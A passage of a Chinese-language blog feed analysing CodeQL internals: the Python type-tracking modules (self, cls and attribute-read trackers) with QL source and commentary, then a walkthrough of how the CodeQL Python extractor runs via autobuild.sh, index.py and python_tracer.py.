&#123;</span><br><span class="line">  CallNode() &#123; toAst(<span class="built_in">this</span>) <span class="keyword">instanceof</span> Call &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Gets the flow node corresponding to the function expression for the call corresponding to this flow node */</span></span><br><span class="line">  ControlFlowNode <span class="title function_">getFunction</span><span class="params">()</span> &#123;</span><br><span class="line">    exists(Call c |</span><br><span class="line">      <span class="built_in">this</span>.getNode() = c and</span><br><span class="line">      c.getFunc() = result.getNode() and</span><br><span class="line">      result.getBasicBlock().dominates(<span class="built_in">this</span>.getBasicBlock())</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="filter-1"><a href="#filter-1" class="headerlink" title="filter"></a>filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">predicate <span class="title function_">filter</span><span class="params">(Node n)</span> &#123;</span><br><span class="line">  ignoreForCallGraph(n.getLocation().getFile())</span><br><span class="line">  or</span><br><span class="line">  n.(ParameterNodeImpl).isParameterOf(_, any(ParameterPosition pp | pp.isSelf()))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-2-Make-API"><a href="#2-2-2-Make-API" class="headerlink" title="2.2.2 Make API"></a>2.2.2 Make API</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets a reference to an instance of the class `cls`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Node <span class="title function_">classInstanceTracker</span><span class="params">(Class cls)</span> &#123;</span><br><span class="line">  CallGraphConstruction::Simple::Make&lt;TrackClassInstanceInput&gt;::track(cls)</span><br><span class="line">      .(LocalSourceNode)</span><br><span class="line">      .flowsTo(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-SelfTracker"><a href="#2-3-SelfTracker" class="headerlink" title="2.3 SelfTracker"></a>2.3 SelfTracker</h3><h4 id="2-3-1-TrackSelfInput"><a href="#2-3-1-TrackSelfInput" class="headerlink" title="2.3.1 TrackSelfInput"></a>2.3.1 TrackSelfInput</h4><h5 id="start-2"><a href="#start-2" class="headerlink" title="start"></a>start</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">module</span> TrackSelfInput <span class="keyword">implements</span> <span class="title class_">CallGraphConstruction</span>::Simple::InputSig &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">State</span> = Class;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">start</span><span class="params">(Node start, Class classWithMethod)</span> &#123;</span><br><span class="line">    exists(Function func |</span><br><span class="line">      func = classWithMethod.getAMethod() and</span><br><span class="line">      not <span class="title function_">isStaticmethod</span><span class="params">(func)</span> and</span><br><span class="line">      not <span class="title function_">isClassmethod</span><span class="params">(func)</span></span><br><span class="line">    |</span><br><span class="line">      start.asExpr() = func.getArg(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释义：</p><ul><li>存在Function，是当前class 的方法，并且不是静态方法和内置classmethod 方法，那么该方法的第一个数self 就是start   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bar</span>(<span class="params">self</span>): // <span class="variable language_">self</span> 参数作为 start expr</span><br></pre></td></tr></table></figure></li></ul><h5 id="filter-2"><a href="#filter-2" class="headerlink" title="filter"></a>filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">predicate <span class="title function_">filter</span><span class="params">(Node n)</span> &#123;</span><br><span class="line">  ignoreForCallGraph(n.getLocation().getFile())</span><br><span class="line">  or</span><br><span class="line">  n.(ParameterNodeImpl).isParameterOf(_, any(ParameterPosition pp | pp.isSelf()))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-2-Make-API"><a href="#2-3-2-Make-API" class="headerlink" title="2.3.2 Make API"></a>2.3.2 Make API</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets a reference to the `self` argument of a method on class `classWithMethod`.</span></span><br><span class="line"><span class="comment"> * The method cannot be a `staticmethod` or `classmethod`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Node <span class="title function_">selfTracker</span><span class="params">(Class classWithMethod)</span> &#123;</span><br><span class="line">  CallGraphConstruction::Simple::Make&lt;TrackSelfInput&gt;::track(classWithMethod)</span><br><span class="line">      .(LocalSourceNode)</span><br><span class="line">      .flowsTo(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4-ClassArgumentTracker"><a href="#2-4-ClassArgumentTracker" class="headerlink" title="2.4 ClassArgumentTracker"></a>2.4 ClassArgumentTracker</h3><ul><li>以类中方法第一个参数作为起始点</li><li>跟踪寻找其传播可能</li></ul><h4 id="2-4-1-TrackClsArgumentInput"><a href="#2-4-1-TrackClsArgumentInput" class="headerlink" title="2.4.1 TrackClsArgumentInput"></a>2.4.1 TrackClsArgumentInput</h4><h5 id="start-3"><a href="#start-3" class="headerlink" title="start"></a>start</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">module</span> TrackClsArgumentInput <span class="keyword">implements</span> <span class="title class_">CallGraphConstruction</span>::Simple::InputSig &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">State</span> = Class;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">start</span><span class="params">(Node start, Class classWithMethod)</span> &#123;</span><br><span class="line">    exists(Function func |</span><br><span class="line">      func = classWithMethod.getAMethod() and</span><br><span class="line">      <span class="title function_">isClassmethod</span><span class="params">(func)</span></span><br><span class="line">    |</span><br><span class="line">      start.asExpr() = func.getArg(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">    or</span><br><span class="line">    <span class="comment">// type(self)</span></span><br><span class="line">    start = getTypeCall() and</span><br><span class="line">    start.(CallCfgNode).getArg(<span class="number">0</span>) = selfTracker(classWithMethod)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释义：</p><ol><li>存在Function func，属于class 的方法，那么start 节点就是这个方法的第一个形参<blockquote><p>ps: python 这api 命名规范。。。形参实参不分。。。吐槽</p></blockquote> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class Foo():</span><br><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">cls</span>): // start = cls</span><br></pre></td></tr></table></figure></li><li>type(self) 场景 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class Foo():</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bar</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">type</span>(<span class="variable language_">self</span>) // start = <span class="built_in">type</span>(<span class="variable language_">self</span>)</span><br></pre></td></tr></table></figure></li></ol><h5 id="filter-3"><a href="#filter-3" class="headerlink" title="filter"></a>filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">predicate <span class="title function_">filter</span><span class="params">(Node n)</span> &#123;</span><br><span class="line">  ignoreForCallGraph(n.getLocation().getFile())</span><br><span class="line">  or</span><br><span class="line">  n.(ParameterNodeImpl).isParameterOf(_, any(ParameterPosition pp | pp.isSelf()))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-2-Make-API"><a href="#2-4-2-Make-API" class="headerlink" title="2.4.2 Make API"></a>2.4.2 Make API</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets a reference to the enclosing class `classWithMethod` from within one of its</span></span><br><span class="line"><span class="comment"> * methods, either through the `cls` argument from a `classmethod` or from `type(self)`</span></span><br><span class="line"><span class="comment"> * from a normal method.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Node <span class="title function_">clsArgumentTracker</span><span class="params">(Class classWithMethod)</span> &#123;</span><br><span class="line">  CallGraphConstruction::Simple::Make&lt;TrackClsArgumentInput&gt;::track(classWithMethod)</span><br><span class="line">      .(LocalSourceNode)</span><br><span class="line">      .flowsTo(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-自定义Trackers"><a href="#3-自定义Trackers" class="headerlink" title="3. 自定义Trackers"></a>3. 自定义Trackers</h2><h3 id="3-1-AttrReadTracker"><a href="#3-1-AttrReadTracker" class="headerlink" title="3.1 AttrReadTracker"></a>3.1 AttrReadTracker</h3><p>在分析resolveCall 方法中，其功能是定位Call 和其对应的Function 定义关系，遇到了AttrReadTracker，调用逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">resolveCall(CallNode call, Function target, CallType type)</span><br><span class="line">  resolveMethodCall</span><br><span class="line">    directCall</span><br><span class="line">      findFunctionAccordingToMroKnownStartingClass</span><br><span class="line">      directCall_join</span><br><span class="line">      attrReadTracker</span><br><span class="line">      CallGraphConstruction::Simple::Make&lt;TrackAttrReadInput&gt;</span><br></pre></td></tr></table></figure><p>详细分析下其实现</p><p>顾名思义，是针对属性读的跟踪，分两步</p><ul><li>构造CallGraphConstruction::Simple::InputSig 的实现类TrackAttrReadInput<ul><li>重写start/filter</li></ul></li><li>make AttrReadTracker，从<code>CallGraphConstruction::Simple::Make&lt;TrackAttrReadInput&gt;</code></li><li>调用track 接口</li></ul><h4 id="3-1-1-TrackAttrReadInput"><a href="#3-1-1-TrackAttrReadInput" class="headerlink" title="3.1.1 TrackAttrReadInput"></a>3.1.1 TrackAttrReadInput</h4><h5 id="start-4"><a href="#start-4" class="headerlink" title="start"></a>start</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// =============================================================================</span></span><br><span class="line"><span class="comment">// attribute trackers</span></span><br><span class="line"><span class="comment">// =============================================================================</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">module</span> TrackAttrReadInput <span class="keyword">implements</span> <span class="title class_">CallGraphConstruction</span>::Simple::InputSig &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">State</span> = AttrRead;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">start</span><span class="params">(Node start, AttrRead attr)</span> &#123;</span><br><span class="line">    start = attr and</span><br><span class="line">    pragma[only_bind_into](attr.getObject()) in [</span><br><span class="line">        classTracker(_), classInstanceTracker(_), selfTracker(_), clsArgumentTracker(_),</span><br><span class="line">        superCallNoArgumentTracker(_), superCallTwoArgumentTracker(_, _)</span><br><span class="line">      ]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">filter</span><span class="params">(Node n)</span> &#123;</span><br><span class="line">    ignoreForCallGraph(n.getLocation().getFile())</span><br><span class="line">    or</span><br><span class="line">    n.(ParameterNodeImpl).isParameterOf(_, any(ParameterPosition pp | pp.isSelf()))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释义：</p><ul><li>起点是AttrRead，attr 是能够被跟踪定位对应class 的  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">bar = <span class="string">&#x27;test&#x27;</span> </span><br><span class="line">foo.bar<span class="comment">// foo.bar 是AttrRead，attr.getObject 中的attr，也就是foo 是能够被跟踪的</span></span><br></pre></td></tr></table></figure></li></ul><p>从结果来讲</p><h5 id="filter-4"><a href="#filter-4" class="headerlink" title="filter"></a>filter</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Gets a reference to the attribute read `attr` */</span></span><br><span class="line">Node <span class="title function_">attrReadTracker</span><span class="params">(AttrRead attr)</span> &#123;</span><br><span class="line">  CallGraphConstruction::Simple::Make&lt;TrackAttrReadInput&gt;::track(attr)</span><br><span class="line">      .(LocalSourceNode)</span><br><span class="line">      .flowsTo(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Make-API"><a href="#Make-API" class="headerlink" title="Make API"></a>Make API</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Gets a reference to the attribute read `attr` */</span></span><br><span class="line">Node <span class="title function_">attrReadTracker</span><span class="params">(AttrRead attr)</span> &#123;</span><br><span class="line">  CallGraphConstruction::Simple::Make&lt;TrackAttrReadInput&gt;::track(attr)</span><br><span class="line">      .(LocalSourceNode)</span><br><span class="line">      .flowsTo(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;在分析CodeQL Python 污点分析时候发现，有用到shared 的新模块typetracking。从前面Python 的Extractor 分析中，我们知道它的DB 内是没有类型信息的，没有类型信息是怎么做污点呢？&lt;/p&gt;
&lt;p&gt;Java 是在编译的时候创建的DB，这一过程中可以拿到了AST 节点对应的类型信息，例如call 节点函数信息，可以直接关联callable，知道调的是哪个函数。但是纯AST 要怎么做？&lt;/p&gt;
&lt;p&gt;联想之前做Java 反射Patch 的时候，印象中也需要用到类型跟踪,但是是自己实现的，改动颇大，不知道这个typetracking 是否能够更优雅的解决，分析下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/pasted-923.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CodeQL" scheme="http://m0d9.me/categories/CodeQL/"/>
    
    
    <category term="CodeQL" scheme="http://m0d9.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL Python Extractor 源码分析</title>
    <link href="http://m0d9.me/2025/05/26/CodeQL-Python-Extractor-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2025/05/26/CodeQL-Python-Extractor-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2025-05-26T08:51:00.000Z</published>
    <updated>2025-06-11T11:58:01.604Z</updated>
    
    <content type="html"><![CDATA[<p>最近定位python codeql 的一个cve 复现，发现涉及到extractor 的逻辑，正好之前也有跟踪过java 的经验，应该大差不差，记录下。</p><h2 id="1-架构"><a href="#1-架构" class="headerlink" title="1. 架构"></a>1. 架构</h2><p><img src="/images/pasted-890.png" alt="upload successful"></p><p><a href="https://github.com/github/codeql/blob/main/python/extractor/README.md#2-The-actual-Python-extractor">https://github.com/github/codeql/blob/main/python/extractor/README.md#2-The-actual-Python-extractor</a></p><span id="more"></span><p>从流程图上看</p><h2 id="2-Trap-生成"><a href="#2-Trap-生成" class="headerlink" title="2. Trap 生成"></a>2. Trap 生成</h2><h3 id="2-1-codeql-database-create"><a href="#2-1-codeql-database-create" class="headerlink" title="2.1 codeql database create"></a>2.1 codeql database create</h3><p>新建一个Java 项目任务，配置Debug</p><p><img src="/images/pasted-891.png" alt="upload successful"></p><p>中断ProcessBuilder 发现有两处</p><ul><li>autobuild.sh</li><li>pre-finalize.sh</li></ul><h3 id="2-2-autobuild-sh"><a href="#2-2-autobuild-sh" class="headerlink" title="2.2 autobuild.sh"></a>2.2 autobuild.sh</h3><p><img src="/images/pasted-892.png" alt="upload successful"></p><p>Debug 断点中发现，部分重要env 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;CODEQL_EXTRACTOR_PYTHON_SOURCE_ARCHIVE_DIR&quot; -&gt; &quot;/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/src&quot;</span><br><span class="line">&quot;CODEQL_JAVA_HOME&quot; -&gt; &quot;/Users/m0d9/study/codeql-home/v2.17.2/codeql/tools/osx64/java-aarch64&quot;</span><br><span class="line">&quot;CODEQL_EXTRACTOR_PYTHON_SCRATCH_DIR&quot; -&gt; &quot;/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/working&quot;</span><br><span class="line">&quot;CODEQL_EXTRACTOR_PYTHON_TRAP_DIR&quot; -&gt; &quot;/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/trap/python&quot;</span><br><span class="line">&quot;CODEQL_EXTRACTOR_PYTHON_DIAGNOSTIC_DIR&quot; -&gt; &quot;/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/diagnostic/extractors/python&quot;</span><br><span class="line">&quot;CODEQL_EXTRACTOR_PYTHON_WIP_DATABASE&quot; -&gt; &quot;/Users/m0d9/study/java/codeqlDebug/langflow2.cdb&quot;</span><br><span class="line">&quot;CODEQL_EXTRACTOR_PYTHON_LOG_DIR&quot; -&gt; &quot;/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/log&quot;</span><br><span class="line">&quot;CODEQL_SCRATCH_DIR&quot; -&gt; &quot;/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/working&quot;</span><br><span class="line">&quot;CODEQL_DIST&quot; -&gt; &quot;/Users/m0d9/study/codeql-home/v2.17.2/codeql&quot;</span><br><span class="line">&quot;CODEQL_EXTRACTOR_PYTHON_ROOT&quot; -&gt; &quot;/Users/m0d9/study/codeql-home/v2.17.2/codeql/python&quot;</span><br></pre></td></tr></table></figure><p>其中autobuild 具体代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">set -eu</span><br><span class="line"></span><br><span class="line"># Legacy environment variables for the autobuild infrastructure.</span><br><span class="line">LGTM_SRC=&quot;$(pwd)&quot;</span><br><span class="line">LGTM_WORKSPACE=&quot;$CODEQL_EXTRACTOR_PYTHON_SCRATCH_DIR&quot;</span><br><span class="line">export LGTM_SRC</span><br><span class="line">export LGTM_WORKSPACE</span><br><span class="line"></span><br><span class="line">if which python3 &gt;/dev/null; then</span><br><span class="line">    exec python3 &quot;$CODEQL_EXTRACTOR_PYTHON_ROOT/tools/index.py&quot;</span><br><span class="line">elif which python &gt;/dev/null; then</span><br><span class="line">    exec python &quot;$CODEQL_EXTRACTOR_PYTHON_ROOT/tools/index.py&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;ERROR: Could not find a valid Python distribution. It should be available when running &#x27;which python&#x27; or &#x27;which python3&#x27; in your shell. Python 2 is no longer supported.&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>实际作用就是调用index.py</p><h3 id="2-3-index-py"><a href="#2-3-index-py" class="headerlink" title="2.3 index.py"></a>2.3 index.py</h3><p>为了调试index.py，需要新建Python 项目，把codeql python extractor 目录拷贝至此，配置Debug</p><p><img src="/images/pasted-894.png" alt="upload successful"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CODEQL_EXTRACTOR_PYTHON_SOURCE_ARCHIVE_DIR=/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/src</span><br><span class="line">CODEQL_JAVA_HOME=/Users/m0d9/study/codeql-home/v2.17.2/codeql/tools/osx64/java-aarch64</span><br><span class="line">CODEQL_EXTRACTOR_PYTHON_SCRATCH_DIR=/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/working</span><br><span class="line">CODEQL_EXTRACTOR_PYTHON_TRAP_DIR=/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/trap/python</span><br><span class="line">CODEQL_EXTRACTOR_PYTHON_DIAGNOSTIC_DIR=/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/diagnostic/extractors/python</span><br><span class="line">CODEQL_EXTRACTOR_PYTHON_WIP_DATABASE=/Users/m0d9/study/java/codeqlDebug/langflow2.cdb</span><br><span class="line">CODEQL_EXTRACTOR_PYTHON_LOG_DIR=/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/log</span><br><span class="line">CODEQL_SCRATCH_DIR=/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/working</span><br><span class="line">CODEQL_DIST=/Users/m0d9/study/codeql-home/v2.17.2/codeql</span><br><span class="line">CODEQL_EXTRACTOR_PYTHON_ROOT=/Users/m0d9/study/codeql-home/v2.17.2/codeql/python</span><br><span class="line">CODEQL_EXTRACTOR_PYTHON_SCRATCH_DIR=/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/working</span><br><span class="line">LGTM_SRC=/Users/m0d9/study/codeql-home/v2.17.2/codeql/python/tools</span><br><span class="line">LGTM_WORKSPACE=/Users/m0d9/study/java/codeqlDebug/langflow2.cdb/working</span><br></pre></td></tr></table></figure><p>index.py 代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info &lt; (<span class="number">3</span>, <span class="number">7</span>):</span><br><span class="line">    sys.exit(<span class="string">&quot;ERROR: Python 3.7 or later is required (currently running &#123;&#125;.&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(sys.version_info[<span class="number">0</span>], sys.version_info[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> python_tracer <span class="keyword">import</span> getzipfilename</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;SEMMLE_DIST&#x27;</span> <span class="keyword">in</span> os.environ:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;CODEQL_EXTRACTOR_PYTHON_ROOT&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> os.environ:</span><br><span class="line">        os.environ[<span class="string">&#x27;CODEQL_EXTRACTOR_PYTHON_ROOT&#x27;</span>] = os.environ[<span class="string">&#x27;SEMMLE_DIST&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    os.environ[<span class="string">&quot;SEMMLE_DIST&quot;</span>] = os.environ[<span class="string">&quot;CODEQL_EXTRACTOR_PYTHON_ROOT&quot;</span>]</span><br><span class="line"></span><br><span class="line">tools = os.path.join(os.environ[<span class="string">&#x27;SEMMLE_DIST&#x27;</span>], <span class="string">&quot;tools&quot;</span>)</span><br><span class="line">zippath = os.path.join(tools, getzipfilename())</span><br><span class="line">sys.path = [ zippath ] + sys.path</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> buildtools.index</span><br><span class="line">buildtools.index.main()</span><br></pre></td></tr></table></figure><p>index.py 中的逻辑逻辑比较简单，就是配置一些env 变量，然后调用buildtools</p><h3 id="2-4-buildtools"><a href="#2-4-buildtools" class="headerlink" title="2.4 buildtools"></a>2.4 buildtools</h3><p>buildtools.index.main 实现如下，逻辑如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    version = discover.get_version()</span><br><span class="line">    tracer = os.path.join(os.environ[<span class="string">&quot;SEMMLE_DIST&quot;</span>], <span class="string">&quot;tools&quot;</span>, <span class="string">&quot;python_tracer.py&quot;</span>)</span><br><span class="line">    args = extractor_executable() + site_flag(<span class="number">3</span>) + [tracer] + extractor_options(version)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Calling &quot;</span> + <span class="string">&quot; &quot;</span>.join(args))</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line">    env = os.environ.copy()</span><br><span class="line">    env[<span class="string">&quot;CODEQL_EXTRACTOR_PYTHON_ANALYSIS_VERSION&quot;</span>] = get_analysis_version(version)</span><br><span class="line">    subprocess.check_call(args, env=env)</span><br></pre></td></tr></table></figure><h3 id="2-5-python-tracer-py"><a href="#2-5-python-tracer-py" class="headerlink" title="2.5 python_tracer.py"></a>2.5 python_tracer.py</h3><p><img src="/images/pasted-895.png" alt="upload successful"></p><p>Debug 发现</p><p><img src="/images/pasted-898.png" alt="upload successful"></p><h3 id="2-6-extractor"><a href="#2-6-extractor" class="headerlink" title="2.6 extractor"></a>2.6 extractor</h3><p>python_tracer.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">sys_path = sys.path[:]</span>):</span><br><span class="line">...</span><br><span class="line">    run(options, args, the_traverser, logger)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">options, args, the_traverser, logger: logging.Logger</span>):</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pool = worker.ExtractorPool.from_options(options, trap_dir, archive, logger)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>worker.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 